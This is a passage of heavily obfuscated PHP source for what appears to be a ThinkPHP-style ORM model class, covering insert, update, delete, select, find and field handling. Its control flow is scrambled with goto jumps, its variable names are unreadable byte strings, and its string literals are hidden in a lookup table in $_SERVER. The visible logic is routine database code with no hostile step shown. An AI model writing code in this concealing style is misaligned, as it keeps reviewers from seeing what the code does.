(empty($FòÙ´ŒÊ†±) || $aÔæ÷Üäß¢[$aƒñóŞ˜ùŞ[254]] == $FòÙ´ŒÊ†±) { $this->fields = $aÔæ÷Üäß¢; return; } } } $this->flush(); } } public function flush() { goto E¸ƒîãÔ¯º; d‚Õ¿ùÜ—: foreach ($dÊæµ²íë as $a×²¨Æ»âÛ => $f•¦å”ó¡ê) { $d•°¦“Ş‹ö[$a×²¨Æ»âÛ] = $f•¦å”ó¡ê[$d¿Î¼­‘[29]]; if ($f•¦å”ó¡ê[$d¿Î¼­‘[36]]) { $this->fields[$d¿Î¼­‘[256]] = $a×²¨Æ»âÛ; if ($f•¦å”ó¡ê[$d¿Î¼­‘[39]]) { $this->fields[$d¿Î¼­‘[255]] = !0; } } } $this->fields[$d¿Î¼­‘[257]] = $d•°¦“Ş‹ö; if (think_config($d¿Î¼­‘[253])) { $this->fields[$d¿Î¼­‘[254]] = think_config($d¿Î¼­‘[253]); } goto aèÂŠ»¡Š„; C–³µ÷á§: if (!$dÊæµ²íë) { return !1; } $this->fields = array_keys($dÊæµ²íë); $this->fields[$d¿Î¼­‘[255]] = !1; goto d‚Õ¿ùÜ—; aèÂŠ»¡Š„: if (think_config($d¿Î¼­‘[250])) { $f×°½©½¬Ù = $this->dbName ? $this->dbName : think_config($d¿Î¼­‘[251]); think_var_cache($d¿Î¼­‘[252] . strtolower(get_path_this($f×°½©½¬Ù) . $d¿Î¼­‘[104] . $this->name), $this->fields); } goto cƒ»ï™ØèÒ; E¸ƒîãÔ¯º: $d¿Î¼­‘ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->db->setModel($this->name); $dÊæµ²íë = $this->db->getFields($this->getTableName()); goto C–³µ÷á§; cƒ»ï™ØèÒ: } public function switchModel($f˜Ë¬…Öß„, $aÍâ­¨¡è÷ = array()) { $e½Û÷”¼Æ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Dö¾í·öì± = ucwords(strtolower($f˜Ë¬…Öß„)) . $e½Û÷”¼Æ[258]; if (!class_exists($Dö¾í·öì±)) { think_exception($Dö¾í·öì± . think_lang($e½Û÷”¼Æ[259])); } $this->_extModel = new $Dö¾í·öì±($this->name); if (!empty($aÍâ­¨¡è÷)) { foreach ($aÍâ­¨¡è÷ as $e»¥¯á’¦) { $this->_extModel->setProperty($e»¥¯á’¦, $this->{$e»¥¯á’¦}); } } return $this->_extModel; } public function __set($e»“–²å““, $AåÒŸ¼šÒé) { $this->data[$e»“–²å““] = $AåÒŸ¼šÒé; } public function __get($Bã·¾‰ÆŠ´) { return isset($this->data[$Bã·¾‰ÆŠ´]) ? $this->data[$Bã·¾‰ÆŠ´] : null; } public function __isset($eôÔæÃíĞ) { return isset($this->data[$eôÔæÃíĞ]); } public function __unset($Bñ§ñ£ƒë) { unset($this->data[$Bñ§ñ£ƒë]); } public function __call($cÄæ£Ç…™›, $F ßŞÄÂ) { $c™Ö˜Õ‹—å =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (in_array(strtolower($cÄæ£Ç…™›), $this->methods, !0)) { $this->options[strtolower($cÄæ£Ç…™›)] = $F ßŞÄÂ[0]; return $this; } elseif (in_array(strtolower($cÄæ£Ç…™›), array($c™Ö˜Õ‹—å[260], $c™Ö˜Õ‹—å[261], $c™Ö˜Õ‹—å[262], $c™Ö˜Õ‹—å[263], $c™Ö˜Õ‹—å[264]), !0)) { $Dƒ—¿ÒÛ•î = isset($F ßŞÄÂ[0]) ? $F ßŞÄÂ[0] : $c™Ö˜Õ‹—å[191]; $Dƒ—¿ÒÛ•î = $this->db->parseKey($Dƒ—¿ÒÛ•î); return $this->getField(strtoupper($cÄæ£Ç…™›) . $c™Ö˜Õ‹—å[265] . $Dƒ—¿ÒÛ•î . $c™Ö˜Õ‹—å[266] . $cÄæ£Ç…™›, $c™Ö˜Õ‹—å[260]); } elseif (strtolower(substr($cÄæ£Ç…™›, 0, 5)) == $c™Ö˜Õ‹—å[267]) { $Dƒ—¿ÒÛ•î = think_parse_name(substr($cÄæ£Ç…™›, 5)); $aˆÍ†›­[$Dƒ—¿ÒÛ•î] = $F ßŞÄÂ[0]; return $this->where($aˆÍ†›­)->find(); } elseif (strtolower(substr($cÄæ£Ç…™›, 0, 10)) == $c™Ö˜Õ‹—å[268]) { $Eëğ×œ÷’Ù = think_parse_name(substr($cÄæ£Ç…™›, 10)); $aˆÍ†›­[$Eëğ×œ÷’Ù] = $F ßŞÄÂ[0]; return $this->where($aˆÍ†›­)->getField($F ßŞÄÂ[1]); } elseif (isset($this->_scope[$cÄæ£Ç…™›])) { return $this->scope($cÄæ£Ç…™›, $F ßŞÄÂ[0]); } elseif (method_exists($this, $cÄæ£Ç…™›)) { array_unshift($F ßŞÄÂ, $cÄæ£Ç…™›); return call_user_func_array(array($this, $c™Ö˜Õ‹—å[269]), $F ßŞÄÂ); } else { return call_user_func_array(array(parent, $cÄæ£Ç…™›), $F ßŞÄÂ); } } protected function call() { goto AâÒ¸ç©¹ø; dÉÈ—ì§¾: $d÷Ğ–‹ ÀŸ = call_user_func_array(array($this, $fÉŠîæÕ•), $bŸ­”ñ£); if (method_exists($this, $d¢ÜÇ´Âô•[273])) { $eš´¯¿«ÍÅ = call_user_func_array(array($this, $d¢ÜÇ´Âô•[274]), array($f÷×îŠ ¾Ö, $bŸ­”ñ£, $d÷Ğ–‹ ÀŸ)); if ($eš´¯¿«ÍÅ) { return $eš´¯¿«ÍÅ; } } return $d÷Ğ–‹ ÀŸ; goto fî¼Ñ¡ÌÔ; f‘µòôœ¨: if (isset($bŸ­”ñ£[$fŒèˆÅÙ°ß]) && $bŸ­”ñ£[$fŒèˆÅÙ°ß] === $fÉŠîæÕ•) { think_exception(__CLASS__ . $d¢ÜÇ´Âô•[4] . $fÉŠîæÕ• . think_lang($d¢ÜÇ´Âô•[270])); return; } $bŸ­”ñ£[] = $fÉŠîæÕ•; if (method_exists($this, $d¢ÜÇ´Âô•[271])) { $eš´¯¿«ÍÅ = call_user_func_array(array($this, $d¢ÜÇ´Âô•[272]), array($f÷×îŠ ¾Ö, $bŸ­”ñ£)); if (!is_null($eš´¯¿«ÍÅ) && $eš´¯¿«ÍÅ !== !1) { return $eš´¯¿«ÍÅ; } } goto dÉÈ—ì§¾; AâÒ¸ç©¹ø: $d¢ÜÇ´Âô• =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bŸ­”ñ£ = func_get_args(); $fÉŠîæÕ• = array_shift($bŸ­”ñ£); goto AÇÃ›…š‹´; AÇÃ›…š‹´: $f÷×îŠ ¾Ö = $fÉŠîæÕ•; if (is_array($fÉŠîæÕ•)) { $f÷×îŠ ¾Ö = $fÉŠîæÕ•[1]; $fÉŠîæÕ• = $fÉŠîæÕ•[0]; } $fŒèˆÅÙ°ß = count($bŸ­”ñ£) - 1; goto f‘µòôœ¨; fî¼Ñ¡ÌÔ: } protected function _initialize() { } protected function _facade($BÏ²éïƒÆ§) { $bêéËÀçÌ© =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!empty($this->fields)) { foreach ($BÏ²éïƒÆ§ as $d“™¿œã†ì => $dÆ°™ëò¶) { if (is_array($this->fields) && !in_array($d“™¿œã†ì, $this->fields, !0)) { unset($BÏ²éïƒÆ§[$d“™¿œã†ì]); } elseif (is_scalar($dÆ°™ëò¶)) { $this->_parseType($BÏ²éïƒÆ§, $d“™¿œã†ì); } } } if (!empty($this->options[$bêéËÀçÌ©[275]])) { $BÏ²éïƒÆ§ = array_map($this->options[$bêéËÀçÌ©[275]], $BÏ²éïƒÆ§); unset($this->options[$bêéËÀçÌ©[275]]); } $this->_beforeWrite($BÏ²éïƒÆ§); return $BÏ²éïƒÆ§; } protected function _beforeWrite(&$B‚Ğ¬´Ãá) { } public function add($c†¹Ò‰æ„  = '', $bË§ƒ³ÎãÇ = array(), $B¬…‰ßË = false) { goto c–ï…«³¿ñ; e”¦Ÿ•×¥: if (!1 === $this->_beforeInsert($c†¹Ò‰æ„ , $bË§ƒ³ÎãÇ)) { return !1; } $f”•‰ˆ×Í = $this->db->insert($c†¹Ò‰æ„ , $bË§ƒ³ÎãÇ, $B¬…‰ßË); if (!1 !== $f”•‰ˆ×Í) { $D†ì«ïêŒ¤ = $this->getLastInsID(); if ($D†ì«ïêŒ¤) { $c†¹Ò‰æ„ [$this->getPk()] = $D†ì«ïêŒ¤; $this->_after_insert($c†¹Ò‰æ„ , $bË§ƒ³ÎãÇ); return $D†ì«ïêŒ¤; } $this->_after_insert($c†¹Ò‰æ„ , $bË§ƒ³ÎãÇ); } goto Fåé×˜Øçå; c–ï…«³¿ñ: if (empty($c†¹Ò‰æ„ )) { if (!empty($this->data)) { $c†¹Ò‰æ„  = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[í¤âËÚ£¶íÊ¢][276]); return !1; } } $bË§ƒ³ÎãÇ = $this->_parseOptions($bË§ƒ³ÎãÇ); $c†¹Ò‰æ„  = $this->_facade($c†¹Ò‰æ„ ); goto e”¦Ÿ•×¥; Fåé×˜Øçå: return $f”•‰ˆ×Í; goto f“îöÑôšÆ; f“îöÑôšÆ: } protected function _beforeInsert(&$AĞ¯»äŒØÖ, $D¼Ó„ï›Œ£) { } protected function _after_insert($A«·ùäêÉ‰, $Fë›¯¼) { } public function addAll($bğ¶ÓÌÁº, $dÒ …¬™ø = array(), $B‹˜ÏÍ×× = false) { goto eø§Àª¿éë; eø§Àª¿éë: $CÉ†ÒÒÙ± =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (empty($bğ¶ÓÌÁº)) { $this->error = think_lang($CÉ†ÒÒÙ±[276]); return !1; } $dÒ …¬™ø = $this->_parseOptions($dÒ …¬™ø); goto CÅ‹ğÜÄÌÓ; CÅ‹ğÜÄÌÓ: foreach ($bğ¶ÓÌÁº as $A™¨í½Íô => $AÚ ¯ëË…‘) { $bğ¶ÓÌÁº[$A™¨í½Íô] = $this->_facade($AÚ ¯ëË…‘); } if (method_exists($this->db, $CÉ†ÒÒÙ±[277])) { $CÈÂõŠî­ = $this->db->insertAll($bğ¶ÓÌÁº, $dÒ …¬™ø, $B‹˜ÏÍ××); } else { $this->startTrans(); foreach ($bğ¶ÓÌÁº as $A™¨í½Íô => $AÚ ¯ëË…‘) { $CÈÂõŠî­ = $this->db->insert($AÚ ¯ëË…‘, $dÒ …¬™ø, $B‹˜ÏÍ××); } $this->commit(); } if (!1 !== $CÈÂõŠî­) { $eŞæËñƒÙ… = $this->getLastInsID(); if ($eŞæËñƒÙ…) { return $eŞæËñƒÙ…; } } goto b ëí¯Õ; b ëí¯Õ: return $CÈÂõŠî­; goto a›õÑëš‚Ë; a›õÑëš‚Ë: } public function selectAdd($DÌñÂ»«×¨ = '', $Eœ‰«„¾×ˆ = '', $CÎøôçà©ì = array()) { $e‘ßĞµ·±Ù =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CÎøôçà©ì = $this->_parseOptions($CÎøôçà©ì); if (!1 === ($bÁôÚ¤š¾À = $this->db->selectInsert($DÌñÂ»«×¨ ? $DÌñÂ»«×¨ : $CÎøôçà©ì[$e‘ßĞµ·±Ù[278]], $Eœ‰«„¾×ˆ ? $Eœ‰«„¾×ˆ : $this->getTableName(), $CÎøôçà©ì))) { $this->error = think_lang($e‘ßĞµ·±Ù[279]); return !1; } else { return $bÁôÚ¤š¾À; } } public function save($bÈğ‰¬Ê½¬ = '', $Cå³ì‚·Æ’ = array()) { goto a¼‘¿øºˆ; cÙ‹Ç®æ§š: $Cå³ì‚·Æ’ = $this->_parseOptions($Cå³ì‚·Æ’); $aÑà¡«Ò´ = $this->getPk(); if (!isset($Cå³ì‚·Æ’[$f–±÷Ö˜‘¦[280]])) { if (isset($bÈğ‰¬Ê½¬[$aÑà¡«Ò´])) { $d‹ÅƒéÍß[$aÑà¡«Ò´] = $bÈğ‰¬Ê½¬[$aÑà¡«Ò´]; $Cå³ì‚·Æ’[$f–±÷Ö˜‘¦[280]] = $d‹ÅƒéÍß; unset($bÈğ‰¬Ê½¬[$aÑà¡«Ò´]); } else { $this->error = think_lang($f–±÷Ö˜‘¦[279]); return !1; } } goto bŠÛ›»ŠŠ³; dÂ²ïİ›¸Ÿ: if (!1 !== $b‚ÜƒÀåÖ©) { if (isset($DÈ„ëóËÚ‰)) { $bÈğ‰¬Ê½¬[$aÑà¡«Ò´] = $DÈ„ëóËÚ‰; } $this->_afterUpdate($bÈğ‰¬Ê½¬, $Cå³ì‚·Æ’); } return $b‚ÜƒÀåÖ©; goto F¹Œ˜Ïß÷Ë; bŠÛ›»ŠŠ³: if (is_array($Cå³ì‚·Æ’[$f–±÷Ö˜‘¦[280]]) && isset($Cå³ì‚·Æ’[$f–±÷Ö˜‘¦[280]][$aÑà¡«Ò´])) { $DÈ„ëóËÚ‰ = $Cå³ì‚·Æ’[$f–±÷Ö˜‘¦[280]][$aÑà¡«Ò´]; } if (!1 === $this->_beforeUpdate($bÈğ‰¬Ê½¬, $Cå³ì‚·Æ’)) { return !1; } $b‚ÜƒÀåÖ© = $this->db->update($bÈğ‰¬Ê½¬, $Cå³ì‚·Æ’); goto dÂ²ïİ›¸Ÿ; a¼‘¿øºˆ: $f–±÷Ö˜‘¦ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (empty($bÈğ‰¬Ê½¬)) { if (!empty($this->data)) { $bÈğ‰¬Ê½¬ = $this->data; $this->data = array(); } else { $this->error = think_lang($f–±÷Ö˜‘¦[276]); return !1; } } $bÈğ‰¬Ê½¬ = $this->_facade($bÈğ‰¬Ê½¬); goto cÙ‹Ç®æ§š; F¹Œ˜Ïß÷Ë: } protected function _beforeUpdate(&$FºÓÓĞŒ©, $b‘²ß«Ï•Ü) { } protected function _afterUpdate($e¤Æºë ­Í, $bÀÌ–Äƒ¨Œ) { } public function delete($B¦ÊÔç”à = array()) { goto fìâÈÏ’²Í; e”â®êÈ’Ò: $b‹¥ÖŒ—‰ = $this->db->delete($B¦ÊÔç”à); if (!1 !== $b‹¥ÖŒ—‰) { $a‡Ó¢Ÿ»‡× = array(); if (isset($EæÇÉÊ·‹µ)) { $a‡Ó¢Ÿ»‡×[$b¿é‘ŒŒ°] = $EæÇÉÊ·‹µ; } $this->_after_delete($a‡Ó¢Ÿ»‡×, $B¦ÊÔç”à); } return $b‹¥ÖŒ—‰; goto CÃ·ß¸¾Ø; DàŠÊôÈÂ†: if (is_numeric($B¦ÊÔç”à) || is_string($B¦ÊÔç”à)) { if (strpos($B¦ÊÔç”à, $Fãç¢³æÖ•[47])) { $eĞá×áô°²[$b¿é‘ŒŒ°] = array($Fãç¢³æÖ•[281], $B¦ÊÔç”à); } else { $eĞá×áô°²[$b¿é‘ŒŒ°] = $B¦ÊÔç”à; } $this->options[$Fãç¢³æÖ•[280]] = $eĞá×áô°²; } $B¦ÊÔç”à = $this->_parseOptions(); if (is_array($B¦ÊÔç”à[$Fãç¢³æÖ•[280]]) && isset($B¦ÊÔç”à[$Fãç¢³æÖ•[280]][$b¿é‘ŒŒ°])) { $EæÇÉÊ·‹µ = $B¦ÊÔç”à[$Fãç¢³æÖ•[280]][$b¿é‘ŒŒ°]; } goto e”â®êÈ’Ò; fìâÈÏ’²Í: $Fãç¢³æÖ• =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (empty($B¦ÊÔç”à) && empty($this->options[$Fãç¢³æÖ•[280]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $b¿é‘ŒŒ° = $this->getPk(); goto DàŠÊôÈÂ†; CÃ·ß¸¾Ø: } protected function _after_delete($DÚ¦’©‡‚, $EŠ»îÙ¼”õ) { } public function select($D‚ÑÏğÈª = array()) { goto Dµ‹­¾ñğ¡; aäˆ…ùÄ: $C‰ÁĞšª£Ã = $this->db->select($D‚ÑÏğÈª); if (!1 === $C‰ÁĞšª£Ã) { return !1; } if (empty($C‰ÁĞšª£Ã)) { return null; } goto b“˜°Ÿƒñ¤; b“˜°Ÿƒñ¤: $this->_afterSelect($C‰ÁĞšª£Ã, $D‚ÑÏğÈª); return $C‰ÁĞšª£Ã; goto Cã£‰áÂŸ¼; Dµ‹­¾ñğ¡: $Bä‰ŠŠ¾î½ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (is_string($D‚ÑÏğÈª) || is_numeric($D‚ÑÏğÈª)) { $EÔ‡äÕƒ‰Ö = $this->getPk(); if (strpos($D‚ÑÏğÈª, $Bä‰ŠŠ¾î½[47])) { $e—í¾¶˜ [$EÔ‡äÕƒ‰Ö] = array($Bä‰ŠŠ¾î½[281], $D‚ÑÏğÈª); } else { $e—í¾¶˜ [$EÔ‡äÕƒ‰Ö] = $D‚ÑÏğÈª; } $this->options[$Bä‰ŠŠ¾î½[280]] = $e—í¾¶˜ ; } elseif (!1 === $D‚ÑÏğÈª) { $D‚ÑÏğÈª = $this->_parseOptions(); return $Bä‰ŠŠ¾î½[282] . $this->db->buildSelectSql($D‚ÑÏğÈª) . $Bä‰ŠŠ¾î½[283]; } $D‚ÑÏğÈª = $this->_parseOptions(); goto aäˆ…ùÄ; Cã£‰áÂŸ¼: } protected function _afterSelect(&$b»ˆÕó·ì, $A«¼š…”…æ) { } public function buildSql($b¤„İÛÃÈª = array()) { $F±¬ºÇÇìÛ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $b¤„İÛÃÈª = $this->_parseOptions($b¤„İÛÃÈª); return $F±¬ºÇÇìÛ[282] . $this->db->buildSelectSql($b¤„İÛÃÈª) . $F±¬ºÇÇìÛ[283]; } public function optionsValue($d‚öèÆÁßÔ = null) { if (is_null($d‚öèÆÁßÔ)) { return $this->options; } elseif (is_array($d‚öèÆÁßÔ)) { $this->options = array_merge($this->options, $d‚öèÆÁßÔ); } } protected function _parseOptions($eÛÓ‘šÒöî = array()) { goto F³ƒèïô¡Î; Bá‡å·ÃĞ»: if (!isset($eÛÓ‘šÒöî[$eã‹ùÈğ‚[284]])) { $eÛÓ‘šÒöî[$eã‹ùÈğ‚[284]] = $this->getTableName(); $D¢ç„„…õ = $this->fields; } else { $D¢ç„„…õ = $this->getDbFields(); } if (!empty($eÛÓ‘šÒöî[$eã‹ùÈğ‚[285]])) { $eÛÓ‘šÒöî[$eã‹ùÈğ‚[284]] .= $eã‹ùÈğ‚[50] . $eÛÓ‘šÒöî[$eã‹ùÈğ‚[285]]; } $eÛÓ‘šÒöî[$eã‹ùÈğ‚[286]] = $this->name; goto FÌª™›ƒÖ×; F³ƒèïô¡Î: $eã‹ùÈğ‚ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (is_array($eÛÓ‘šÒöî)) { $eÛÓ‘šÒöî = array_merge($this->options, $eÛÓ‘šÒöî); } $this->options = array(); goto Bá‡å·ÃĞ»; FÌª™›ƒÖ×: if (isset($eÛÓ‘šÒöî[$eã‹ùÈğ‚[280]]) && is_array($eÛÓ‘šÒöî[$eã‹ùÈğ‚[280]]) && !empty($D¢ç„„…õ) && !isset($eÛÓ‘šÒöî[$eã‹ùÈğ‚[287]]) && !isset($eÛÓ‘šÒöî[$eã‹ùÈğ‚[284]])) { foreach ($eÛÓ‘šÒöî[$eã‹ùÈğ‚[280]] as $c­ô·¶¹ãå => $bÚéĞ¡°Ø) { $c­ô·¶¹ãå = trim($c­ô·¶¹ãå); if (in_array($c­ô·¶¹ãå, $D¢ç„„…õ, !0)) { if (is_scalar($bÚéĞ¡°Ø)) { $this->_parseType($eÛÓ‘šÒöî[$eã‹ùÈğ‚[280]], $c­ô·¶¹ãå); } } elseif (!is_numeric($c­ô·¶¹ãå) && $eã‹ùÈğ‚[80] != substr($c­ô·¶¹ãå, 0, 1) && !1 === strpos($c­ô·¶¹ãå, $eã‹ùÈğ‚[104]) && !1 === strpos($c­ô·¶¹ãå, $eã‹ùÈğ‚[265]) && !1 === strpos($c­ô·¶¹ãå, $eã‹ùÈğ‚[288]) && !1 === strpos($c­ô·¶¹ãå, $eã‹ùÈğ‚[289])) { unset($eÛÓ‘šÒöî[$eã‹ùÈğ‚[280]][$c­ô·¶¹ãå]); } } } $this->_options_filter($eÛÓ‘šÒöî); return $eÛÓ‘šÒöî; goto föÑœ«›òº; föÑœ«›òº: } protected function _options_filter(&$F¯ Ó¾ªô¿) { } protected function _parseType(&$CÓÏŠÙåÇÃ, $eÇ½°Ó…ß) { $DÄÒ¹ÜÔøç =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (empty($this->options[$DÄÒ¹ÜÔøç[290]][$DÄÒ¹ÜÔøç[4] . $eÇ½°Ó…ß])) { $B’ÖĞ•ê‰« = strtolower($this->fields[$DÄÒ¹ÜÔøç[257]][$eÇ½°Ó…ß]); if (!1 !== strpos($B’ÖĞ•ê‰«, $DÄÒ¹ÜÔøç[291])) { } elseif (!1 === strpos($B’ÖĞ•ê‰«, $DÄÒ¹ÜÔøç[292]) && !1 !== strpos($B’ÖĞ•ê‰«, $DÄÒ¹ÜÔøç[293])) { $CÓÏŠÙåÇÃ[$eÇ½°Ó…ß] = intval($CÓÏŠÙåÇÃ[$eÇ½°Ó…ß]); } elseif (!1 !== strpos($B’ÖĞ•ê‰«, $DÄÒ¹ÜÔøç[294]) || !1 !== strpos($B’ÖĞ•ê‰«, $DÄÒ¹ÜÔøç[295])) { $CÓÏŠÙåÇÃ[$eÇ½°Ó…ß] = floatval($CÓÏŠÙåÇÃ[$eÇ½°Ó…ß]); } elseif (!1 !== strpos($B’ÖĞ•ê‰«, $DÄÒ¹ÜÔøç[296])) { $CÓÏŠÙåÇÃ[$eÇ½°Ó…ß] = (bool) $CÓÏŠÙåÇÃ[$eÇ½°Ó…ß]; } } } public function find($F‹¢™ØßÖù = array()) { goto B§®ÔÖÉæ‹; bŞ×Ÿñ ©: $F‹¢™ØßÖù = $this->_parseOptions(); $ağ¨ÁáÄÏ = $this->db->select($F‹¢™ØßÖù); if (!1 === $ağ¨ÁáÄÏ) { return !1; } goto E®ô¢Œ‡ó°; E®ô¢Œ‡ó°: if (empty($ağ¨ÁáÄÏ)) { return null; } $this->data = $ağ¨ÁáÄÏ[0]; $this->_afterFind($this->data, $F‹¢™ØßÖù); goto eŠ¶ÖÜöóÌ; eŠ¶ÖÜöóÌ: if (!empty($this->options[$A—Ó‚†åÀµ[298]])) { return $this->returnResult($this->data, $this->options[$A—Ó‚†åÀµ[298]]); } return $this->data; goto EŒ§‡£…ˆƒ; B§®ÔÖÉæ‹: $A—Ó‚†åÀµ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (is_numeric($F‹¢™ØßÖù) || is_string($F‹¢™ØßÖù)) { $B¥›‚õ°”[$this->getPk()] = intval($F‹¢™ØßÖù); $this->options[$A—Ó‚†åÀµ[280]] = $B¥›‚õ°”; } $this->options[$A—Ó‚†åÀµ[297]] = 1; goto bŞ×Ÿñ ©; EŒ§‡£…ˆƒ: } protected function _afterFind(&$Cíİ‰¥º›’, $bÓƒ½•²Ñ°) { } protected function returnResult($AĞ‚İ¡òê, $BÓá³Í‡À… = '') { $C°ºÂ«øÅİ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($BÓá³Í‡À…) { if (is_callable($BÓá³Í‡À…)) { return call_user_func($BÓá³Í‡À…, $AĞ‚İ¡òê); } switch (strtolower($BÓá³Í‡À…)) { case $C°ºÂ«øÅİ[299]: return json_encode($AĞ‚İ¡òê); case $C°ºÂ«øÅİ[300]: return xml_encode($AĞ‚İ¡òê); } } return $AĞ‚İ¡òê; } public function parseFieldsMap($féìÇ É´, $Eİ‹ŒÍÙ• = 1) { if (!empty($this->_map)) { foreach ($this->_map as $b’µç¼ù» => $CÆëí¼Şƒ£) { if ($Eİ‹ŒÍÙ• == 1) { if (isset($féìÇ É´[$CÆëí¼Şƒ£])) { $féìÇ É´[$b’µç¼ù»] = $féìÇ É´[$CÆëí¼Şƒ£]; unset($féìÇ É´[$CÆëí¼Şƒ£]); } } else { if (isset($féìÇ É´[$b’µç¼ù»])) { $féìÇ É´[$CÆëí¼Şƒ£] = $féìÇ É´[$b’µç¼ù»]; unset($féìÇ É´[$b’µç¼ù»]); } } } } return $féìÇ É´; } public function setField($cÙğİá¶¤¯, $bğïğö‡ã = '') { if (is_array($cÙğİá¶¤¯)) { $Fñ„¬Êƒ› = $cÙğİá¶¤¯; } else { $Fñ„¬Êƒ›[$cÙğİá¶¤¯] = $bğïğö‡ã; } return $this->save($Fñ„¬Êƒ›); } public function setAdd($dÁ©ö®ñœ§, $fµ‘®‘¥á¡ = 1) { $F×Øè‘˜¶ò =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cÛİ¸ÅÔÚ = $dÁ©ö®ñœ§ . $F×Øè‘˜¶ò[301] . $fµ‘®‘¥á¡; if ($fµ‘®‘¥á¡ < 0) { $cÛİ¸ÅÔÚ = $dÁ©ö®ñœ§ . $fµ‘®‘¥á¡; } return $this->setField($dÁ©ö®ñœ§, array($F×Øè‘˜¶ò[302], $cÛİ¸ÅÔÚ)); } public function getField($E¹‘¾Ÿò, $añëªÍğÔ = null) { $f£¾É³Æ»Í =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BÏù„†‰Ìß[$f£¾É³Æ»Í[278]] = $E¹‘¾Ÿò; $BÏù„†‰Ìß = $this->_parseOptions($BÏù„†‰Ìß); $E¹‘¾Ÿò = trim($E¹‘¾Ÿò); if (strpos($E¹‘¾Ÿò, $f£¾É³Æ»Í[47])) { if (!isset($BÏù„†‰Ìß[$f£¾É³Æ»Í[297]])) { $BÏù„†‰Ìß[$f£¾É³Æ»Í[297]] = is_numeric($añëªÍğÔ) ? $añëªÍğÔ : $f£¾É³Æ»Í[33]; } $B‘Š—ò‰™Ñ = $this->db->select($BÏù„†‰Ìß); if (!empty($B‘Š—ò‰™Ñ)) { goto CäÆšŞ§‡; fÊ…˜×¿: foreach ($B‘Š—ò‰™Ñ as $Bš‡šÊˆíÇ) { $C†™É¼Öƒ = $Bš‡šÊˆíÇ[$f–‹¿ øˆ¹]; if (2 == $Fø…åˆ¸Äù) { $d’ø¢á×õ‹[$C†™É¼Öƒ] = $Bš‡šÊˆíÇ[$cÖá¦æÈ]; } else { $d’ø¢á×õ‹[$C†™É¼Öƒ] = is_string($añëªÍğÔ) ? implode($añëªÍğÔ, $Bš‡šÊˆíÇ) : $Bš‡šÊˆíÇ; } } return $d’ø¢á×õ‹; goto bŠ±¡¥Ó‚; CäÆšŞ§‡: $cŒä¥­Ğ½• = explode($f£¾É³Æ»Í[47], $E¹‘¾Ÿò); $E¹‘¾Ÿò = array_keys($B‘Š—ò‰™Ñ[0]); $f–‹¿ øˆ¹ = array_shift($E¹‘¾Ÿò); goto bš†£â; bš†£â: $cÖá¦æÈ = array_shift($E¹‘¾Ÿò); $d’ø¢á×õ‹ = array(); $Fø…åˆ¸Äù = count($cŒä¥­Ğ½•); goto fÊ…˜×¿; bŠ±¡¥Ó‚: } } else { if (!0 !== $añëªÍğÔ) { $BÏù„†‰Ìß[$f£¾É³Æ»Í[297]] = is_numeric($añëªÍğÔ) ? $añëªÍğÔ : 1; } if ($añëªÍğÔ === $f£¾É³Æ»Í[260]) { unset($BÏù„†‰Ìß[$f£¾É³Æ»Í[297]]); } $Bš‡šÊˆíÇ = $this->db->select($BÏù„†‰Ìß); if (!empty($Bš‡šÊˆíÇ)) { if ($añëªÍğÔ === $f£¾É³Æ»Í[260]) { return reset($Bš‡šÊˆíÇ[0]); } if (!0 !== $añëªÍğÔ && 1 == $BÏù„†‰Ìß[$f£¾É³Æ»Í[297]]) { return reset($Bš‡šÊˆíÇ[0]); } foreach ($Bš‡šÊˆíÇ as $B›©ß‚‡«Ñ) { $aŠ­÷ùÖÒ[] = $B›©ß‚‡«Ñ[$E¹‘¾Ÿò]; } return $aŠ­÷ùÖÒ; } } return null; } public function create($DÄ¯µñ¥ø = '', $AÏ²éˆÜç· = '') { goto aË­ŒŞÒªŠ; F°…¨Æ¢®ç: if ($this->autoCheckFields) { $BÑìö‹´ä² = $this->getDbFields(); foreach ($DÄ¯µñ¥ø as $E„®»¶“ => $b°²ƒ¬„Ç®) { if (!in_array($E„®»¶“, $BÑìö‹´ä²)) { unset($DÄ¯µñ¥ø[$E„®»¶“]); } elseif (MAGIC_QUOTES_GPC && is_string($b°²ƒ¬„Ç®)) { $DÄ¯µñ¥ø[$E„®»¶“] = stripslashes($b°²ƒ¬„Ç®); } } } $this->autoOperation($DÄ¯µñ¥ø, $AÏ²éˆÜç·); $this->data = $DÄ¯µñ¥ø; goto eÃ’´ÔÊ; Bæà÷ƒµ’: if (isset($BÑìö‹´ä²)) { if (is_string($BÑìö‹´ä²)) { $BÑìö‹´ä² = explode($E‚ª’¤¾ê’[47], $BÑìö‹´ä²); } if (think_config($E‚ª’¤¾ê’[303])) { $BÑìö‹´ä²[] = think_config($E‚ª’¤¾ê’[304]); } foreach ($DÄ¯µñ¥ø as $E„®»¶“ => $b°²ƒ¬„Ç®) { if (!in_array($E„®»¶“, $BÑìö‹´ä²)) { unset($DÄ¯µñ¥ø[$E„®»¶“]); } } } if (!$this->autoValidation($DÄ¯µñ¥ø, $AÏ²éˆÜç·)) { return !1; } if (!$this->autoCheckToken($DÄ¯µñ¥ø)) { $this->error = think_lang($E‚ª’¤¾ê’[305]); return !1; } goto F°…¨Æ¢®ç; eÃ’´ÔÊ: return $DÄ¯µñ¥ø; goto CÈèŠ¶ºÆ‰; cÓòƒ¶í­: $DÄ¯µñ¥ø = $this->parseFieldsMap($DÄ¯µñ¥ø, 0); $AÏ²éˆÜç· = $AÏ²éˆÜç· ? $AÏ²éˆÜç· : (!empty($DÄ¯µñ¥ø[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if 